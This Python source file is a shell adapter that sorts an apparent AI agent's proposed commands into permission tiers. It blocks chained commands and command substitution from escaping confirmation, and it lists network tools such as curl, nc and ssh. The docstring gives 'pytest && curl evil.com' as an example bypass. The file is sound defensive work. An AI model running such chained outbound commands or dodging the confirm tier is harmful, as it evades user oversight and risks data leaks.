"""Shell adapter.

The classifier is the security-relevant part. It splits on shell operators
first, because `pytest && curl evil.com` must be judged on its worst segment,
not its first one -- classifying the whole string by its leading token is a
one-character bypass of the always-confirm tier.
"""

from __future__ import annotations

import re
import shlex
from typing import Any

from ..actions import ProposedAction, ToolResult
from ..permissions import ActionType
from ..plan import PlanStep
from ..runners import DEFAULT_TIMEOUT_S, CommandOutcome
from .base import ToolAdapter, ToolError

NETWORK_BINARIES = frozenset(
    {
        "curl", "wget", "ssh", "scp", "sftp", "rsync", "ftp", "nc", "netcat",
        "telnet", "http", "httpie", "aria2c",
    }
)

GIT_NETWORK_SUBCOMMANDS = frozenset({"push", "pull", "fetch", "clone", "remote", "submodule"})

GIT_REWRITE_SUBCOMMANDS = frozenset({"rebase", "filter-branch", "filter-repo"})

INSTALLERS = frozenset(
    {"pip", "pip3", "uv", "npm", "pnpm", "yarn", "poetry", "apt", "apt-get",
     "brew", "gem", "cargo", "go", "bundle"}
)

#: Installer invocations that only restore what a lockfile already pins.
LOCKED_INSTALL_MARKERS = frozenset({"ci", "sync", "restore", "--frozen", "--frozen-lockfile"})

INSTALL_SUBCOMMANDS = frozenset({"install", "add", "i", "get"})

TEST_BINARIES = frozenset(
    {"pytest", "tox", "nox", "unittest", "ruff", "mypy", "pyright", "flake8",
     "black", "isort", "eslint", "prettier", "tsc", "jest", "vitest", "mocha",
     "cargo-test", "make"}
)

DELETE_BINARIES = frozenset({"rm", "rmdir", "unlink", "shred", "srm"})

#: Splits on ; && || | & and newlines, keeping it simple and conservative.
_SEGMENT_RE = re.compile(r"(?:\|\||&&|[;|&\n])")

#: Command substitution hides arbitrary commands from token inspection.
_SUBSTITUTION_RE = re.compile(r"\$\(|`|<\(")

#: Risk ordering used to pick a command's classification from its segments.
#: Everything in ALWAYS_CONFIRM sorts above everything that does not.
_RISK_ORDER = [
    ActionType.SHELL_TEST,
    ActionType.GIT_COMMIT,
    ActionType.DEPENDENCY_LOCKED,
    ActionType.SHELL_OTHER,
    ActionType.DEPENDENCY_NEW,
    ActionType.FILE_DELETE,
    ActionType.SHELL_NETWORK,
    ActionType.GIT_HISTORY_REWRITE,
]


def _tokens(segment: str) -> list[str]:
    try:
        return shlex.split(segment)
    except ValueError:
        # Unbalanced quotes -- refuse to guess, treat as untrusted.
        return []


def _classify_git(tokens: list[str]) -> ActionType:
    args = [t for t in tokens[1:] if t]
    sub = next((a for a in args if not a.startswith("-")), "")

    if sub in GIT_REWRITE_SUBCOMMANDS:
        return ActionType.GIT_HISTORY_REWRITE
    if sub == "reset" and "--hard" in args:
        return ActionType.GIT_HISTORY_REWRITE
    if sub == "commit" and "--amend" in args:
        return ActionType.GIT_HISTORY_REWRITE
    if sub == "push" and any(
        a in ("--force", "-f", "--force-with-lease") or a.startswith("+") for a in args
    ):
        return ActionType.GIT_HISTORY_REWRITE
    if sub in GIT_NETWORK_SUBCOMMANDS:
        return ActionType.SHELL_NETWORK
    if sub == "commit":
        return ActionType.GIT_COMMIT
    return ActionType.SHELL_OTHER


def _classify_installer(tokens: list[str]) -> ActionType:
    args = tokens[1:]
    if any(marker in args for marker in LOCKED_INSTALL_MARKERS):
        # A lockfile restore is on the auto-approved list (Section 5) but it
        # still reaches the network, which is on the always-confirm list. The
        # spec says the always-confirm tier has no exceptions, so network wins.
        return ActionType.SHELL_NETWORK
    if any(a in INSTALL_SUBCOMMANDS for a in args):
        named = [a for a in args if not a.startswith("-") and a not in INSTALL_SUBCOMMANDS]
        if any(a in ("-r", "--requirement") for a in args):
            return ActionType.SHELL_NETWORK
        return ActionType.DEPENDENCY_NEW if named else ActionType.SHELL_NETWORK
    return ActionType.SHELL_OTHER


def classify_segment(segment: str) -> ActionType:
    tokens = _tokens(segment)
    if not tokens:
        return ActionType.SHELL_OTHER

    binary = tokens[0].rsplit("/", 1)[-1]

    if binary == "git":
        return _classify_git(tokens)
    if binary in INSTALLERS:
        return _classify_installer(tokens)
    if binary in NETWORK_BINARIES:
        return ActionType.SHELL_NETWORK
    if binary in DELETE_BINARIES:
        return ActionType.FILE_DELETE
    if binary == "find" and "-delete" in tokens:
        return ActionType.FILE_DELETE
    if binary in TEST_BINARIES:
        return ActionType.SHELL_TEST
    if binary in ("npx", "uvx", "python", "python3", "node") and len(tokens) > 1:
        nested = tokens[1].rsplit("/", 1)[-1]
        if nested == "-m" and len(tokens) > 2:
            nested = tokens[2]
        if nested in TEST_BINARIES:
            return ActionType.SHELL_TEST
        if nested in INSTALLERS:
            return _classify_installer(tokens[1:])
    return ActionType.SHELL_OTHER


def classify(command: str) -> ActionType:
    """Classify a full command line by its highest-risk segment."""
    if _SUBSTITUTION_RE.search(command):
        # Substituted commands are invisible to token inspection. Refuse to
        # auto-approve anything containing one.
        return ActionType.SHELL_OTHER

    segments = [s.strip() for s in _SEGMENT_RE.split(command) if s.strip()]
    if not segments:
        return ActionType.SHELL_OTHER

    worst = ActionType.SHELL_TEST
    for segment in segments:
        candidate = classify_segment(segment)
        if _RISK_ORDER.index(candidate) > _RISK_ORDER.index(worst):
            worst = candidate
    return worst


class ShellTool(ToolAdapter):
    name = "shell"

    def __init__(self, workspace, *, runner=None, timeout_s: int = DEFAULT_TIMEOUT_S) -> None:
        super().__init__(workspace, runner=runner)
        self.timeout_s = timeout_s

    def propose(self, step: PlanStep) -> ProposedAction:
        command = step.params.get("command")
        if not command:
            raise ToolError(f"step {step.index}: shell requires a 'command' param")

        action_type = classify(command)
        return ProposedAction(
            action_type=action_type,
            tool=self.name,
            summary=f"Run: {command}",
            step_index=step.index,
            payload={"command": command, "cwd": str(self.workspace)},
            preview={
                "command": command,
                "cwd": str(self.workspace),
                "classified_as": action_type.value,
                # Where it will land, shown *before* approval. A command about
                # to run on the host is a different decision from the same
                # command about to run in a throwaway container.
                "runs_in": self.runner.describe(),
            },
        )

    async def execute(self, action: ProposedAction, *, hunk_ids: list[str] | None = None) -> Any:
        return await self.runner.run(
            action.payload["command"], cwd=self.workspace, timeout_s=self.timeout_s
        )

    def result(self, action: ProposedAction, raw: CommandOutcome) -> ToolResult:
        command = action.payload["command"]
        where = self.runner.kind

        if raw.timed_out:
            return ToolResult(
                ok=False,
                summary=f"Timed out after {self.timeout_s}s: {command}",
                data={"command": command, "timed_out": True, "runs_in": where},
            )

        ok = raw.exit_code == 0
        return ToolResult(
            ok=ok,
            summary=f"{'Ran' if ok else 'Failed'} ({raw.exit_code}) in {where}: {command}",
            output=raw.output,
            data={"command": command, "exit_code": raw.exit_code, "runs_in": where},
        )
